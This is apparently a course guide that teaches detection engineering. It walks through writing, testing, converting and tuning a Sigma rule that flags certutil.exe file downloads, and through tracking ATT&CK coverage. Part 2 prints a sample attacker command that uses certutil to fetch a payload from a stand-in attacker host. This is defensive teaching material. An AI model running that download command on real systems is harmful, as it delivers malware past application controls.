# Guide 01 (Intermediate): Detection Engineering with Sigma Rules

**Level:** Intermediate

**Estimated time:** 50 minutes

**Prerequisites:** Basic guides 01–03, Sessions 7–8 (threat hunting and event correlation)

---

## Objective

By the end of this guide, you will be able to:

* Write a Sigma detection rule from a threat intelligence source
* Test and convert Sigma rules to SIEM query languages
* Build a detection coverage map using MITRE ATT&CK Navigator
* Apply the detection development lifecycle to a real threat scenario

---

## Background

Detection engineering is the discipline of systematically building, testing, and maintaining security detection rules.
It is the bridge between threat intelligence and operational monitoring.
Without detection engineers, threat intelligence never becomes alerting capability.

**The detection development lifecycle:**

```text
THREAT → HYPOTHESIS → DETECTION RULE → TEST → DEPLOY → TUNE → FEEDBACK
```

---

## Setup

```console
cd guides/intermediate/guide-01-detection-engineering
docker compose up --build
docker compose exec detection-env bash
```

The container includes: Python with `sigma-cli`, test data, and sample threat intelligence.

---

## Part 1: Understanding the Sigma Rule Structure

A Sigma rule is a YAML document with these key sections:

```yaml
title: [Human-readable name]
id: [UUID]
status: [stable | test | experimental]
description: [What it detects]
references: [Links to CVEs, ATT&CK, advisories]
tags: [ATT&CK technique IDs]
logsource:
  category: [process_creation | network_connection | etc.]
  product: [windows | linux | aws]
detection:
  selection:      ← The matching criteria
    FieldName: value
  filter:         ← Exclusions (reduce false positives)
    FieldName: legitimate_value
  condition: selection and not filter
falsepositives: [Known legitimate scenarios]
level: [informational | low | medium | high | critical]
```

---

## Part 2: Write a Detection Rule from a Threat Report

**Scenario:** Your CTI team has shared that APT-34 uses a specific technique: they execute `certutil.exe` to download payloads from the internet using its built-in certificate decoding functionality (a "living off the land" technique).

ATT&CK reference: T1105 (Ingress Tool Transfer) + T1027.002 (Obfuscated Files)

```powershell
# Typical attacker command:
certutil -urlcache -split -f http://attacker.com/payload.exe C:\Windows\Temp\payload.exe
```

### Write the Sigma rule:

```yaml
title: Certutil Download Cradle
id: c5a0a513-4b1d-4ad4-acf9-de20e3d2b70f
status: stable
description: Detects use of certutil.exe to download files from the internet —
  a common living-off-the-land technique used by multiple threat actors
  to bypass application whitelisting.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1218/003/
author: SOC Team
date: 2026/01/15
tags:
  - attack.defense_evasion
  - attack.t1218.003
  - attack.command_and_control
  - attack.t1105
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    Image|endswith: '\certutil.exe'
  selection_cli:
    CommandLine|contains:
      - '-urlcache'
      - '-verifyctl'
      - 'http://'
      - 'https://'
      - 'ftp://'
  condition: selection_img and selection_cli
falsepositives:
  - Legitimate certificate verification using certutil.exe with network access
  - IT administrators using certutil for legitimate downloads in deployment scripts
level: high
```

---

## Part 3: Test the Rule Against Sample Events

The container includes sample Windows process creation logs.

```bash
# Install sigma CLI if needed
pip install sigma-cli

# Test the rule against sample data
sigma check rule.yml

# Convert to Elastic query
sigma convert -t elasticsearch -p ecs-windows rule.yml

# Convert to Splunk
sigma convert -t splunk rule.yml

# Convert to Microsoft Sentinel KQL
sigma convert -t sentinel rule.yml
```

**Elastic output example:**

```json
{
  "query": {
    "bool": {
      "must": [
        {"match": {"process.name": "certutil.exe"}},
        {"bool": {"should": [
          {"match": {"process.command_line": "-urlcache"}},
          {"match": {"process.command_line": "http://"}}
        ]}}
      ]
    }
  }
}
```

---

## Part 4: Tune for False Positives

After testing, you discover that the Windows Update WSUS service also uses certutil with HTTPS internally.
Add a filter:

```yaml
detection:
  selection_img:
    Image|endswith: '\certutil.exe'
  selection_cli:
    CommandLine|contains:
      - '-urlcache'
      - '-verifyctl'
      - 'http://'
  filter_legitimate:
    CommandLine|contains:
      - 'update.microsoft.com'
      - 'windowsupdate.com'
  condition: selection_img and selection_cli and not filter_legitimate
```

**Tuning principle:** Always add exclusions based on observed false positives from your environment — generic exclusions from the internet may not fit your specific infrastructure.

---

## Part 5: ATT&CK Coverage Mapping

Use ATT&CK Navigator to visualise your detection coverage.

### Manually tracking coverage:

```python
# coverage.py — simple coverage tracker
coverage = {
    "T1566.001": {"name": "Spear-phishing Attachment", "status": "covered"},
    "T1059.001": {"name": "PowerShell", "status": "covered"},
    "T1059.003": {"name": "Windows Command Shell", "status": "partial"},
    "T1105": {"name": "Ingress Tool Transfer", "status": "covered"},  # just added!
    "T1218.003": {"name": "Certutil", "status": "covered"},           # just added!
    "T1078": {"name": "Valid Accounts", "status": "not_covered"},
    "T1021.002": {"name": "SMB/Windows Admin Shares", "status": "not_covered"},
}

total = len(coverage)
covered = sum(1 for v in coverage.values() if v["status"] == "covered")
print(f"Coverage: {covered}/{total} = {covered/total*100:.1f}%")
```

---

## Part 6: The Detection-as-Code Workflow

In a mature SOC, detection rules are treated like code:

```text
1. WRITE RULE in YAML (Sigma)

         ↓
2. PEER REVIEW (pull request)
         ↓
3. AUTOMATED TESTS (sigma-cli check + test against known events)
         ↓
4. DEPLOY to SIEM (CI/CD pipeline converts Sigma → SIEM query)
         ↓
5. MONITOR performance (FP rate, TP count)
         ↓
6. TUNE as needed → back to step 1
```

Benefits:

* All rules version-controlled (change history, rollback)
* Automated quality checks prevent broken deployments
* Multi-SIEM deployment from one source rule
* Peer review improves rule quality

---

## Summary

Detection engineering systematically converts threat intelligence into actionable SIEM rules.
Sigma provides a vendor-agnostic rule language that compiles to any SIEM's query language.
Good detection engineers think about false positive reduction from the start, track ATT&CK coverage gaps, and treat detection rules as production code requiring testing, review, and lifecycle management.

---

## Clean Up

```console
docker compose down
```
